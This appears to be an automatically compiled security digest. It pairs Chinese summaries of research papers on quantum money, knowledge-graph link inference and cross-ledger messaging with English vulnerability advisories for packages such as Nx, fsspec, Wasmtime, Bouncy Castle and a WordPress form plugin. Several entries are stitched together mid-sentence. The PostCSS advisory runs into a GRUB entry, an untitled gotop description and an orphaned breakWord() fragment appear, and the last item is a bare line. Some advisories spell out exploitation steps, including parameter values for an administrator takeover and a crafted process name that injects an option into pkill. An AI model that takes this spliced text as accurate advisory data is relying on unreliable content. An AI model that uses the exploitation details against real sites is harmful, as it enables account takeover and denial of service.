llm_summary.summary_zh: 本文研究基于纽结的量子货币(quantum money from knots)及其推广形式「不变量货币」(invariant money)的安全性根基。这类方案的安全性依赖「路径查找困难」假设:在两个具有相同不变量的等价对象之间,找出一串合法移位(move)序列是困难的。作者指出,目前并不存在仅从该假设出发的安全性证明,已有证明都额外引入「知道路径」(knowledge-of-path)假设——断言任何能输出两个同不变量对象的高效算法在隐含意义上「知道」二者之间的一条路径。这类假设既无法被任何攻击证伪,也无从由安全性推出。论文因此追问:路径查找究竟在什么条件下才是正确的假设。作者证明:当每个等价类都是某个可高效计算且可叠加的群作用(group action)的轨道,并且每个 move 都表现为一个群元素时(例如图的情形),路径查找的平均情况困难性对安全性是必要的。对纽结而言不存在这样的已知群,此时即便拥有路径查找器,伪造也只能归约到一个同样困难的态制备(state preparation)问题上。于是论文转向更本质的假设:无论有无路径查找器,伪造者终究必须制备一个能通过验证的量子态,作者将该任务的困难性确立为新的「制备假设」。对于验证随机游走在多项式时间内混合的方案,制备假设表述为:给定一张新铸造钞票的序列号,以及从它测量得到的一个对象,任何高效算法都无法制备出可被接受的态。该假设是可证伪的,且等价于「先测量自己钞票的伪造者无法成功」这一目标安全性。另一个「传输假设」(transfer assumption)由安全性所蕴含,它断言先测量至多让伪造者付出多项式因子的额外代价。制备假设与传输假设合起来即等价于完整安全性,因此任何安全性证明都必须建立制备假设。论文最后给出一个分离结果:若制备假设成立,则任何「仅在给定序列号处调用伪造者」的完全黑盒归约,都无法从制备假设推导出传输假设。
llm_summary.why_it_matters_zh: 量子货币是量子密码学中最具前瞻性的方向之一,但其安全性长期建立在不可证伪的「知道路径」假设之上。本文厘清了路径查找何时才是必要假设,提出可证伪的态制备假设,并给出黑盒归约分离下界,为判断量子货币方案是否真正安全提供了新判据,对量子安全认证与令牌类研究具有方法论价值。
llm_summary.impact_zh: 主要影响量子货币、量子认证令牌等基于「搜索困难/态制备困难」的密码方案的安全性论证框架:评审者与方案设计者需重新审视是否依赖不可证伪的 knowledge-of-path 类假设,并关注黑盒归约的适用边界。该分析思路也可迁移到其他后量子密码假设的可证伪性评估。
defense_advice_zh: 在评估量子货币或量子令牌类方案时,优先识别其安全性证明是否依赖不可证伪的「知道路径」类假设,并要求作者给出可证伪的替代假设。
跟踪「制备假设 + 传输假设 ⇔ 安全性」这一等价框架,将其纳入内部密码方案评审清单,作为判断安全证明是否完备的检查项。
llm_summary.recommended_action_zh: 研究跟进

items.title: Link Inference Attack on Privacy-Preserving Knowledge Graphs
items.summary: Knowledge Graphs (KGs) are widely used to store and share structured information across sensitive domains such as healthcare, fi- nance, and social networks. A common privacy practice is to delete sen- sitive relations before publishing the graph, under the assumption that removing edges is sufficient to prevent their recovery. In this paper, we challenge this assumption and show that even when a relation is fully or partially hidden, its existence leaves structural traces in the public graph that can be exploited to recover it with high accuracy. To this end, we propose a link inference attack that operates on the topology of the public graph, and evaluate it under two privacy scenarios that differ in how the adversary exploits the knowledge available to him. In the first setting where the adversary exploits all topological information, the attack achieves near-perfect discrimination (AP = 0.949, ROC-AUC = 0.999), while in the more realistic one where the adversary makes use of some semantic information, it recovers up to 74% of hidden edges. Build- ing on these results, we further conduct a structural analysis to identify which topological properties of the graph drive the attack success, re- vealing that privacy risk is not uniform across entities and that certain structural patterns make specific relations significantly more vulnerable to inference than others.

llm_summary.summary_zh: 该论文聚焦知识图谱（KG）发布过程中的隐私保护问题。知识图谱被广泛用于医疗、金融和社交网络等敏感领域，常见隐私做法是在发布前删除敏感关系（即边），并默认删边足以阻止这些关系被恢复。作者明确挑战这一假设，指出即使某条关系被完全或部分隐藏，其在公开图拓扑中仍会留下可被利用的结构性痕迹，从而以高精度推断出被隐藏的关系。为此，论文提出一种基于公开图拓扑的链接推断攻击，并在两种隐私场景下进行评估：第一种场景中攻击者利用全部拓扑信息，攻击达到近乎完美的区分能力（AP=0.949，ROC-AUC=0.999）；第二种更贴近现实的场景中，攻击者利用部分语义信息，仍能恢复高达 74% 的隐藏边。在此基础上，作者进一步开展结构分析，识别出驱动攻击成功的拓扑属性，发现隐私风险在不同实体间并不均匀分布，某些结构模式使特定关系显著更易被推断。论文的核心贡献在于证明单纯删边不足以保护知识图谱中的敏感关系，并提供了一种结构化的风险评估视角，为图数据发布者设计更稳健的隐私保护机制（如拓扑扰动、差分隐私、访问控制等）提供了依据。该工作适合隐私保护、图数据挖掘与数据安全方向的研究人员和工程实践者阅读。
llm_summary.why_it_matters_zh: 对依赖删边脱敏来共享知识图谱的机构（医疗、金融、社交等）构成直接警示：无需接触隐藏边，仅凭公开图结构即可高概率还原敏感关系。提示现有图发布流程需引入结构性隐私评估与更强防护手段。
llm_summary.impact_zh: 影响知识图谱发布、图数据共享平台、隐私工程与差分隐私图算法评估等场景；可迁移到任何以图结构承载敏感关系的开放数据发布流程。
detection_signals_zh: 对已发布知识图谱查询接口的异常访问：短时间内大量枚举实体邻域、路径或子图。
图数据库/图 API 出现高频、自动化、覆盖式结构查询，与正常业务查询分布显著偏离。
同一主体反复查询与特定敏感关系相关的局部拓扑，可能对应链接推断探测。
查询日志中出现系统性的二跳/三跳邻居枚举，且覆盖大量不同实体。
对发布图谱的批量下载或快照请求，尤其是涉及完整拓扑结构的拉取行为。
defense_advice_zh: 不要仅依赖删除边来保护敏感关系，发布前应对图拓扑进行隐私风险评估。
采用拓扑扰动、边增删、图匿名化（如 k-匿名）或差分隐私图发布机制。
对公开图查询接口实施访问控制、速率限制与查询审计，检测枚举式结构探测。
在发布数据中引入语义混淆或关系泛化，降低结构痕迹与语义信息的可利用性。
结合结构分析与实体级风险评估，对高风险实体/关系采取更强保护或不发布。
定期用链接推断基线评估已发布图谱的残余隐私风险。
llm_summary.recommended_action_zh: 研究跟进，并纳入图数据发布前的隐私风险评估流程

items.title: XIM: The XDC Interledger Messaging Protocol
items.summary: Distributed ledgers, privacy-preserving institutional networks, and conventional payment systems increasingly need to exchange authenticated messages and settle assets across heterogeneous trust domains. Existing interoperability systems typically optimize for one of three concerns: application-level abstraction, cross-chain message transport, or synchronized execution within a related ledger family. This paper proposes XIM, the XDC Interledger Messaging Protocol, a chain-agnostic protocol for transporting canonical messages across heterogeneous networks while allowing each communication lane to select an explicit verification policy. XIM separates message semantics from transport, verification, execution, routing, asset identity, and compliance metadata. Its cryptographic state is represented by deterministic message identifiers and commitment roots, while an append-only transition log provides auditability and replay protection. XIM introduces a Universal Asset Identifier (UAID), a pluggable adapter interface, lane-scoped security policies, and an optional policy-aware route graph for multi-hop settlement. XDC Network can serve as a coordination and settlement domain without requiring every XIM message or route to transact through XDC. We specify the protocol model, state machine, message encoding, commitment structure, verification modes, failure semantics, security assumptions, threat model, implementation architecture, and an incremental deployment plan. The design targets public blockchains, permissioned ledgers, institutional networks, and authenticated financial-system gateways, with particular attention to stablecoins, tokenized assets, trade finance, and ISO 20022-compatible payment workflows.

llm_summary.summary_zh: 该论文针对分布式账本、隐私保护型机构网络与传统支付系统之间日益增长的互操作性需求，指出现有跨域互操作方案通常只优化三类目标中的一类：应用层抽象、跨链消息传输，或同一账本家族内的同步执行，难以同时满足异构信任域之间的认证消息交换与资产结算需求。为此，作者提出 XIM（XDC Interledger Messaging Protocol），一种链无关（chain-agnostic）的协议，用于在异构网络之间传输规范化消息，并允许每一条通信通道（lane）自行选择显式的验证策略。XIM 的核心设计理念是解耦：将消息语义与传输、验证、执行、路由、资产标识及合规元数据相互分离。其密码学状态由确定性消息标识符和承诺根（commitment root）表示，并辅以仅追加（append-only）的转移日志，从而提供可审计性与重放保护。协议引入了若干关键构件：通用资产标识符（UAID）、可插拔适配器接口、通道级安全策略，以及可选的、策略感知的多跳结算路由图。值得注意的是，XDC 网络可作为协调与结算域，但并不要求每条 XIM 消息或路由都必须经过 XDC 交易，这降低了耦合度与成本。论文给出了完整的协议规范，包括协议模型、状态机、消息编码、承诺结构、验证模式、失败语义、安全假设、威胁模型、实现架构以及增量部署计划。目标场景覆盖公有链、许可链、机构网络和经认证的金融系统网关，并特别关注稳定币、代币化资产、贸易融资以及与 ISO 20022 兼容的支付工作流。这是一篇偏体系结构与协议设计的论文，属于规范/设计类贡献，摘要未给出实验评测、性能基准或在野部署数据，因此其安全性与性能主张尚待独立验证。
llm_summary.why_it_matters_zh: 跨链消息与结算通道是近年链上与链下资金攻击的高价值目标。XIM 将验证策略、重放保护、威胁模型与合规元数据显式化，为安全团队评估异构信任域消息总线提供了可参考的设计基线与评审清单。
llm_summary.impact_zh: 可迁移至跨链桥 / 互操作中间件、机构级支付网关、稳定币与代币化资产结算、贸易融资平台以及 ISO 20022 报文对接场景；对采用 UAID、通道级策略与仅追加日志的系统，可参考其审计与重放防护思路。
detection_signals_zh: 跨链通道出现重复或乱序的消息标识符，疑似重放或重放防护失效
承诺根（commitment root）与转移日志记录不一致或日志出现非追加式改写
某条 lane 的验证策略被静默降级或绕过（如由完整验证改为轻验证）
多跳路由图出现异常路径、非预期中继节点或路由策略突变为宽松匹配
defense_advice_zh: 对跨链消息中继实施消息标识符去重与序号连续性校验，维护本地独立的承诺根比对记录
将仅追加转移日志纳入不可篡改存储与定期一致性校验，防止日志被回滚或篡改
对通道级验证策略变更建立审批与告警机制，禁止运行时静默降级
在多跳结算场景中显式白名单化路由与适配器，限制可插拔适配器的权限边界
部署前对其威胁模型与安全假设做独立评审，补足论文未覆盖的实测与性能验证
llm_summary.recommended_action_zh: 研究跟进

items.title: On quantum interactive proofs with a laconic prover
items.summary: Interactive proof systems with a laconic prover, studied by Goldreich, Vadhan, and Wigderson (CC, 2002), capture problems verifiable with logarithmic prover communication in the classical setting. For two-message quantum analogs, even a single-bit prover response contains quantum statistical zero-knowledge ($\sf QSZK$), introduced by Watrous (FOCS 2002). However, restricting the verifier's question to classical public coins collapses the corresponding class to $\sf BQP$, as shown by Beigi, Shor, and Watrous (ToC, 2011). We further study two-message quantum interactive proof systems with a laconic prover. To this end, we introduce the class ${\sf QIP}_{\ell\text{-}{\rm bit}}(2)$, where $\ell$ is the length of the prover's response, and establish: 1. A natural complete characterization of ${\sf QIP}_{\ell\text{-}{\rm bit}}(2)$ by Multi-State Distinguishability. In particular, Quantum State Distinguishability (QSD) is ${\sf QIP}_{\rm bit}$-complete. Since QSD is $\sf QSZK$-hard, our result places ${\sf QIP}_{\ell\text{-}{\rm bit}}(2)$, for $\ell\geq 2$, in a landscape "just above" $\sf QSZK$. 2. Easy regimes for ${\sf QIP}_{\ell\text{-}{\rm bit}}(2)$ collapsing to $\sf QSZK$. We prove that QSD$[a,b]$ (and thus ${\sf QIP}_{\rm bit}[a,b]$) is in $\sf QSZK$ when $a(n)-b(n)\geq 1/O(\log n)$, and combine this with an answer compression from ${\sf QIP}_{\ell\text{-}{\rm bit}}[2,c,s]$ to ${\sf QIP}_{\rm bit}$ to obtain another easy regime when $2c>(1+2^{\ell/2})s$. Remarkably, our improved polarization applies to SD and $\sf SZK$, resolving an open problem in Sahai and Vadhan (JACM, 2003). 3. Quantum public coins also make the interaction useless: ${\sf qc}\text{-}{\sf QAM}[O(\sqrt{\log{n}})]$ with constant gap is in $\sf BQP$, where ${\sf qc}\text{-}{\sf QAM}[\ell]$ is a subclass of ${\sf QIP}_{\ell\text{-}{\rm bit}}(2)$ in which the verifier's question is exactly halves of EPR pairs.

llm_summary.summary_zh: 该论文研究带简洁证明者（laconic prover）的两消息量子交互证明系统。经典情形下，Goldreich、Vadhan 与 Wigderson（CC 2002）提出的简洁证明者交互证明系统，刻画了证明者以对数级通信即可验证的一类问题。在量子两消息类比中，证明者即使只回复一个比特，也足以包含量子统计零知识（QSZK，Watrous FOCS 2002）。然而 Beigi、Shor 与 Watrous（ToC 2011）证明，若将验证者的问题限制为经典公开硬币，相应复杂度类会塌缩到 BQP。本文进一步刻画带 laconic prover 的两消息量子交互证明，定义类 QIP_{ℓ-bit}(2)，其中 ℓ 为证明者回复长度，并给出三项结果。第一，用多状态可区分性（Multi-State Distinguishability）对 QIP_{ℓ-bit}(2) 给出自然完全刻画；特别地，量子状态可区分性 QSD 是 QIP_bit-完全的，而 QSD 是 QSZK-难的，因此 ℓ≥2 的 QIP_{ℓ-bit}(2) 落在“略高于”QSZK 的层级。第二，给出塌缩到 QSZK 的易处理区间：当 a(n)-b(n) ≥ 1/O(log n) 时 QSD[a,b]（进而 QIP_bit[a,b]）属于 QSZK；结合从 QIP_{ℓ-bit}[2,c,s] 到 QIP_bit 的答案压缩，在 2c > (1+2^{ℓ/2})s 时也属于 QSZK。其改进的极化（polarization）技术还适用于 SD 与 SZK，解决了 Sahai 与 Vadhan（JACM 2003）留下的开放问题。第三，证明量子公开硬币同样使交互失效：常数间隙下 qc-QAM[O(√log n)] 属于 BQP，其中 qc-QAM[ℓ] 是 QIP_{ℓ-bit}(2) 的子类，其验证者问题恰为 EPR 对的一半。论文适合量子复杂性理论、量子密码学与交互式证明研究者阅读。
llm_summary.why_it_matters_zh: 从防御视角看，这属于量子复杂度理论的基础进展，直接影响对 QSZK/QSD 等假设的精确刻画，为后量子零知识与证明系统的安全性边界提供理论依据；但短期内不产生可运营的检测或防护规则。
llm_summary.impact_zh: 理论影响：厘清 laconic 量子交互证明与 QSZK、BQP 的层级关系，修正公开硬币下交互无用的边界条件；可迁移至量子零知识协议、后量子密码假设的稳健性分析。无直接工程或防护影响。
defense_advice_zh: 无直接可落地的防御动作；如需跟进，仅建议在密码学理论评审中关注 QSZK/QSD 假设的适用边界。
llm_summary.recommended_action_zh: 研究跟进（理论层）；纳入后量子密码学安全假设的内部评估清单

items.title: probe-image-size: Quadratic-time Denial of Service in the SVG Parser
items.summary: probe-image-size gets image dimensions without downloading the entire file. Prior to 7.4.0, lib/parse_sync/svg.js and lib/parse_stream/svg.js use the searching regular expression /<[-_.:a-zA-Z0-9][^>]*>/, which repeatedly scans to the end of input when attacker-controlled data contains many less-than characters without a closing greater-than character. The synchronous parser converts and scans the full supplied buffer without an input cap, while the streaming parser reparses the complete accumulated SVG prefix for every received chunk. The probe.sync(), probe(stream), and probe(url) entry points can therefore block the Node.js event loop at full CPU, and attacker-controlled chunking can amplify the streaming cost. This issue is fixed in version 7.4.0.

items.title: Wasmtime: Preemption and traps during bulk operations enable breaking internal VM state
items.summary: Wasmtime is a runtime for WebAssembly. From 46.0.0 until 46.0.2 and 47.0.3, fuel and epoch preemption checks inside bulk operations including memory.copy, table.grow, and array.copy can expose invalid intermediate state when an embedder mutates a Store in Store::epoch_deadline_callback or continues using a Store after cancellation or a trap. A cancelled non-nullable table growth can leave null elements, linear-memory growth during memory.copy can invalidate retained raw pointers, and callback-triggered garbage collection during array.copy can invalidate GC pointers, resulting in a crash, invalid memory access, or GC heap corruption. Embeddings whose callbacks only access the host data in Store<T>, and embeddings that discard a Store after timeout or epoch deadline, are not affected. This issue is fixed in versions 46.0.2 and 47.0.3.

items.title: Nx daemon and plugin worker sockets are accessible to other local users
items.summary: Nx is a monorepo solution for TypeScript and polyglot codebases. From 14.6.0 until 22.7.9 and 23.1.2, Nx creates Unix domain sockets for its daemon and isolated plugin workers in shared temporary locations without owner-only directory and socket permissions. Another unprivileged local account on a shared build server, developer host, or multi-user container can discover and connect to a running socket because the transport performs no authentication and relies on filesystem containment. The daemon's PROCESS_IN_BACKGROUND request accepts a module path and invokes its default export, allowing a caller that controls a file to execute code as the account running Nx; other handlers can expose workspace file contents, project graphs, and task hashes. Disabling the daemon alone does not remove the vulnerable plugin-worker sockets, while single-user machines without another local account are not exposed. This issue is fixed in versions 22.7.9 and 23.1.2.

items.title: Nx: Path traversal in nx migrate package-migrations extraction
items.summary: Nx is a monorepo solution for TypeScript and polyglot codebases. From 13.10.0 until 22.7.10 and 23.2.1, Nx migration planning reads the nx-migrations.migrations value from a target package manifest without validating that it is a contained relative path. A hostile direct dependency or a package introduced through a trusted package's packageGroup can supply .. segments or an absolute path, causing nx migrate to join an escaping destination onto its temporary directory. The migration archive can then write attacker-controlled bytes outside the temporary directory, while opening the destination stream can truncate an existing writable file even when no archive entry matches. This occurs during migration planning before review of the migration list or use of --run-migrations; the vulnerable installed Nx copy is reached when the normal nx@latest handoff is bypassed with NX_USE_LOCAL, NX_MIGRATE_USE_LOCAL, NX_MIGRATE_CLI_VERSION, --run-id, or fallback after a temporary-install failure. This issue is fixed in versions 22.7.10 and 23.2.1.

items.title: fsspec: Server-Side Template Injection in ReferenceFileSystem leads to Remote Code Execution
items.summary: fsspec is a specification and Python implementation framework for filesystem interfaces. From 0.9.0 until 2026.6.0, fsspec.implementations.reference.ReferenceFileSystem evaluates fields from Kerchunk reference JSON documents through unrestricted jinja2.Template(...).render(...) calls in _process_references1._render_jinja, _process_templates, and _process_gen in fsspec/implementations/reference.py. A document supplied inline or fetched from an attacker-controlled URL can provide template expressions that execute Python code when the reference filesystem is opened, including through consumers such as xarray, before referenced data is read. The _process_gen path is reached whenever a document includes a gen array, while the other paths depend on template-related options and values. This issue is fixed in version 2026.6.0.

items.title: Tinypool: Prototype Pollution Gadget to RCE in run() options
items.summary: Tinypool is a minimal Node.js worker thread pool implementation. Prior to 2.1.2, Tinypool reads filename from a caller-supplied options object in pool.run(task, options) without requiring an own property, so a polluted Object.prototype.filename can replace the intended worker module. Applications are affected only when they pass their own second-argument options object to pool.run(); calls without that argument use the trusted default options object. An attacker who can first pollute the prototype can cause the worker pool to load attacker-selected JavaScript and can read or modify task data with the host process's privileges. This issue is fixed in version 2.1.2.

items.title: PostCSS: Quadratic complexity in flat selector parsing allows CPU exhaustion
items.summary: PostCSS Selector Parser is a CSS selector parser that integrates with PostCSS but does not require it. Prior to 7.1.6, src/parser.js splitWord() can receive a flat selector as one word token carrying many class or ID indexes because period and hash characters are not tokenizer word delimiters. The uniqs() deduplication and per-index class and ID membership checks repeatedly scan the class and ID index arrays, while a separate Sass-interpolation filtering pass also performs repeated linear scanning. items.title: Bypass of GRUB lockdown restriction in Secure Boot mode via serial command MMIO base address
items.summary:
A local attacker with control over GRUB's configuration can bypass lockdown restrictions when booting with Secure Boot and load an unsigned GRUB module, while GRUB continues to report lockdown is enabled.




The vulnerability is caused by insufficient validation of the MMIO base address passed to the GRUB serial command. GRUB does not validate that the base address corresponds to a UART device, rather than being an arbitrary memory address. This allows an attacker to trick GRUB into writing non-arbitrary data at an attacker-controlled address, including resetting the grub_file_verifiers list in a way that disables the subsequent verification of loaded modules.

A local attacker can create a process with a crafted name beginning with -- (e.g. containing a target user's UID). When the user running gotop invokes the kill feature on that process, pkill interprets the crafted name as a command-line option, terminating all processes owned by the targeted user.

items.title: NTRU leaks private key information by reducing secret values with a non-constant-time integer division
items.summary: In Bouncy Castle for Java before 1.86, NTRU reduced secret values with the % operator in three helpers whose reference implementations are deliberately division-free, so each reduction was carried out by an integer division whose latency depends on the secret operand. Polynomial.modQ divided by a variable divisor, which a compiler cannot strength-reduce to a multiply the way it can a constant one, so it emitted a division on every call including on the decapsulation path where the dividend derives from the private key; Polynomial.mod3 and NTRUSampling.mod3 divided the secret key polynomials f and g during key generation, the message polynomials r and m during encapsulation, and coefficients recovered during decapsulation. An attacker able to measure that timing can recover information about the NTRU private key. modQ now masks, which is exact because q is always a power of two, and mod3 uses the reference implementation's division-free fold and select; the results are unchanged.

items.title: Password-based KDF cost parameters honoured unbounded from untrusted input across the remaining PBE entry points
items.summary: In Bouncy Castle for Java before 1.86, several password-based key derivation entry points ran the KDF with cost parameters taken from the untrusted input being processed, without bounding them, so a small input could dictate an arbitrary amount of work before any password or integrity check could reject it. The affected paths are the RFC 9579 PBMAC1 MAC calculator builders, which took the PBKDF2 iteration count and derived-key length straight out of PBMAC1Params (JcePBMac1CalculatorBuilder, and PKCS12PBEUtils.createPBMac1Calculator reached from PKCS12PfxPdu.isMacValid); the scrypt parallelization parameter p in the PKCS#8 and PKCS#12 cost guards, which bounded only the cost parameter N and the block size r even though the scratch buffer scales with r times p, so the configured memory ceiling could be evaded entirely; the raw JCA PBKDF2 provider (org.bouncycastle.jcajce.provider.symmetric.PBEPBKDF2); and the bcrypt round count read from an encrypted OpenSSH v1 private key's own kdfoptions. Each now bounds the parameter before deriving, in line with the caps already applied elsewhere in the tree, with the OpenSSH round count configurable through the new org.bouncycastle.openssh.max_rounds property. This completes the bounding begun in 1.85 for the PKCS#8 / PBES2 decryptors (CVE-2026-15055). This issue also affects Bouncy Castle for Java LTS before 2.73.13, and Bouncy Castle for Java FIPS (BC-FJA) before bcpkix-fips 1.0.13 (1.0.X series), 2.0.13 (2.0.X series) and 2.1.13 (2.1.X series).

items.title: MLS membership checks compare a uint32 leaf_index as signed, admitting an out-of-range sender
items.summary: In Bouncy Castle for Java before 1.86, the MLS implementation (org.bouncycastle.mls) holds RFC 9420's uint32 leaf_index in a signed int, so a wire value with the top bit set decodes to a negative number. That is a legitimate encoding rather than malformed input, and it must still decode, since the MLS interop test vectors round-trip the full range. GroupKeySet.SecretTree.hasLeaf and Group.validateRemove compared the decoded value directly against the tree's leaf count, and a signed comparison treats any negative int as less than a positive bound, so an out-of-range sender passed the membership check. In the hasLeaf case the SenderData of an unprotected PrivateMessage could then drive LeafIndex.directPath through NodeIndex.parent() arithmetic that never reaches the tree root, growing the resulting node list without bound until the JVM exhausted its heap. A single small message from any current group member could therefore deny service to every other member of the group. Both comparisons now interpret the value as unsigned via Integer.toUnsignedLong, rejecting an out-of-range sender however it was encoded; well-formed leaf indices are unaffected.

items.title: Super Forms – Drag & Drop Form Builder <= 6.3.316 - Authenticated (Subscriber+) Privilege Escalation via 'user_id' Parameter in Register & Login
items.summary: The Super Forms – Drag & Drop Form Builder plugin for WordPress is vulnerable to Privilege Escalation in all versions up to, and including, 6.3.316. This is due to the Register & Login add-on's before_email_success_msg() function, in its register_login_action='update' flow, trusting an attacker-supplied user_id value and passing it to wp_update_user() without any ownership or capability check. Because the super_save_form AJAX action also enforces no capability check, any authenticated user with Subscriber-level access and above can create the required malicious form (register_login_action='update' with register_login_user_id_update='true') and then submit it with user_id set to an administrator's ID along with a new user_pass/user_email. This makes it possible for authenticated attackers with Subscriber-level access and above to overwrite the credentials of arbitrary existing accounts — including administrators — resulting in account takeover and full site compromise.

Under these conditions, breakWord() cannot find a valid break point and returns without consuming a character, so generateFigTextLines() repeatedly processes the same input while consuming CPU and growing memory. The non-default option and attacker-controlled width must both reach an affected call. This issue is fixed in version 1.11.3.

items.title: stream-json: Prototype pollution: Assembler writes this.current[this.key] on plain objects
items.summary: stream-json is a micro-library of stream components for processing JSON and JSONC with a minimal memory footprint. Prior to 3.6.0, Assembler materializes object properties with plain assignment, so an input key named __proto__ invokes the inherited setter and causes parsed object prototype replacement instead of creating an own data property. Applications that make authorization or feature decisions from inherited values can therefore consume attacker-controlled properties, and a null prototype can disrupt code that expects Object.prototype methods. The researcher treats parsing untrusted JSON as part of the project contract, while the maintainer states that documented inputs are locally owned dumps, exports, or logs and characterizes the attack vector as local. The global Object.prototype is not polluted. This issue is fixed in version 3.6.0.

items.title: stream-json: JSONC parser and verifier re-scan the whole accumulated comment on every input chunk
items.summary: stream-json is a micro-library of stream components for processing JSON and JSONC with a minimal memory footprint. Prior to 3.6.0, the JSONC parser at stream-json/jsonc/parser.js and verifier at stream-json/jsonc/verifier.js restart comment-terminator scanning from the opening slash whenever a block or line comment spans an input chunk, while retaining the accumulated comment buffer. Delivering a large valid comment across many small chunks therefore causes quadratic CPU work and can stall the Node.js event loop. The maintainer characterizes the attack vector as local because the documented JSONC input is locally owned or user-controlled configuration, rather than input intended for the open internet. This JSONC-only scope does not include the plain JSON parser, which advances through and discards consumed string and number data. This issue is fixed in version 3.6.0.

items.summary: Filament is a collection of full-stack components for accelerated Laravel development.
